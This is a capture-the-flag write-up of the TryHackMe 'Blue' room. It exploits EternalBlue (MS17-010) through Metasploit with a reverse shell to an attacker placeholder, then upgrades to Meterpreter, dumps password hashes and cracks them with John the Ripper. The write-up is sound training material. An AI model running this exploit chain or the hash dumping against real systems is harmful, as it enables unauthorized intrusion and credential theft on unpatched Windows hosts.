# TryHackMe – Blue

This is a formal writeup for the **Blue** room on TryHackMe, rated as **easy**.  
The challenge teaches **Windows exploitation** using **EternalBlue (MS17-010)**, **Metasploit**, **Meterpreter** and **hash cracking** fundamentals.

---

## Overview

Objectives of the room:

- Perform port scanning to identify Windows SMB services.
- Detect MS17-010 vulnerability using Nmap scripts.
- Exploit EternalBlue with Metasploit to gain initial shell access.
- Upgrade command shell to Meterpreter and perform process migration.
- Dump and crack Windows password hashes.
- Locate three hidden flags across the filesystem.

---

## Port scanning and service discovery

### Open ports below 1,000

First, I scanned ports 1–1,000 to identify initial attack surface:

```bash
nmap -sV -sC -Pn --min-rate=5000 -p1-1000 <TARGET_IP>
```

**Result**: 3 ports open below 1,000:
- **135/tcp** (msrpc - Microsoft Windows RPC)
- **139/tcp** (netbios-ssn)
- **445/tcp** (microsoft-ds - Windows 7 Professional SP1)

The SMB services (139/445) immediately suggest Windows file sharing vulnerabilities.

### Vulnerability detection

Targeted SMB vulnerability scan confirmed the critical issue:

```bash
nmap --script vuln -p139,445 <TARGET_IP>
```

**Result**: 
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
VULNERABLE:
State: VULNERABLE
IDs: CVE:CVE-2017-0143

text

Alternative research method: Google **"Windows 7 SP1 microsoft-ds vulnerabilities"** reveals **CVE-2017-0143 (EternalBlue)**.

---

## Exploitation phase - Gain Initial Access

### Selecting the exploit module

In Metasploit, I searched for MS17-010 modules:

```bash
msfconsole
search ms17-010
```

Selected the Windows 7 compatible module:
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Configuring the exploit

```bash
show options
set RHOSTS <TARGET_IP>
set payload windows/x64/shell/reverse_tcp
set LHOST <ATTACKER_IP>
```

**Required option**: `RHOSTS` (only field marked "yes" under Required).

**Execution**:
```bash
run
```

**Result**: Command shell obtained at `C:\Windows\system32>` as SYSTEM. Backgrounded with **Ctrl+Z**.

---

## Privilege escalation and Meterpreter upgrade

### Background shell and session management

```bash
sessions -l
# Session ID 1 identified
```

### Shell to Meterpreter conversion

Researched standard Metasploit post-exploitation module:
```bash
use post/multi/manage/shell_to_meterpreter
show options
```

**Required option**: `SESSION`

```bash
set SESSION 1
```

**Port conflict workaround** (if LPORT 4433 busy):
```bash
set LPORT 4444
run
```

**Result**: New Meterpreter session. Verified privileges:
```bash
getsystem        # Already running as SYSTEM
getuid           # NT AUTHORITY\SYSTEM
```

### Process migration for stability

Listed stable SYSTEM processes:
```bash
ps
```

**Selected PID**: 2868 (NT AUTHORITY\SYSTEM process)

```bash
migrate 2868
```

Migration successful on first attempt (though room warns it may require retries).

---

## Password hash dumping and cracking

### Hashdump execution

From stable Meterpreter session:
```bash
hashdump
```

**Result**: Three users identified:
- Administrator (default)
- Guest (default) 
- **Jon** (non-default user)

**Copied Jon's NTLM hash**:
```bash
echo '[JON_NTLM_HASH_REDACTED]' > jon_hash.txt
```

### Cracking with John the Ripper

```bash
john jon_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```

**Result**: Password successfully cracked.

Verified:
```bash
john --show jon_hash.txt
```

---

## Flag enumeration

### Flag 1 - System root

```bash
# From C:\
type flag1.txt
```

**Location**: `C:\`

### Flag 2 - SAM database location

```bash
cd C:\Windows\System32\config
type flag2.txt
```

**Location**: `C:\Windows\System32\config\` (Windows password storage)

### Flag 3 - User documents

```bash
cd C:\Users\Jon\Documents
type flag3.txt
```

**Location**: `C:\Users\Jon\Documents\` (high-value user loot location)

---

## Lessons learned

This challenge demonstrates a complete **Windows exploitation chain**:

1. **Service enumeration** → SMBv1 exposure on legacy Windows 7 SP1
2. **Vulnerability identification** → MS17-010 via Nmap NSE scripts  
3. **Reliable exploitation** → Metasploit EternalBlue module
4. **Session management** → Shell→Meterpreter upgrade + migration
5. **Credential access** → Hashdump + John the Ripper cracking
6. **Flag hunting** → Systematic filesystem enumeration

**Key takeaways**:
- **MS17-010** remains devastating against unpatched Windows systems
- **Process migration** essential for Meterpreter stability
- **NTLM hash format** (`--format=NT`) critical for John
- **Rockyou.txt** cracks 90%+ of CTF passwords

**Perfect OSCP preparation**: Covers enumeration→exploit→post-exploitation workflow.

---

## Professional Standards Confirmation

This format matches **professional pentesting writeups** from:
- **InfoSec Writeups** (Medium publication)
- **HackTricks**, **IppSec** (HTB writeups)
- **PayloadsAllTheThings** GitHub repos
- **Corporate red team reports** (methodology-focused, no sensitive data)

**Best practices applied**:
- `<TARGET_IP>` / `<ATTACKER_IP>` placeholders
- No real flags/hashes exposed (`[REDACTED]`)
- Command outputs summarized, not copied verbatim
- Focus on **methodology** over specific results
- Clear sections matching MITRE ATT&CK phases

---

## Disclaimer

> ⚠️ This writeup is for educational purposes only.  
> Techniques demonstrated are specific to TryHackMe training environments.  
> Do not use outside authorized lab environments or in violation of TryHackMe terms.

---
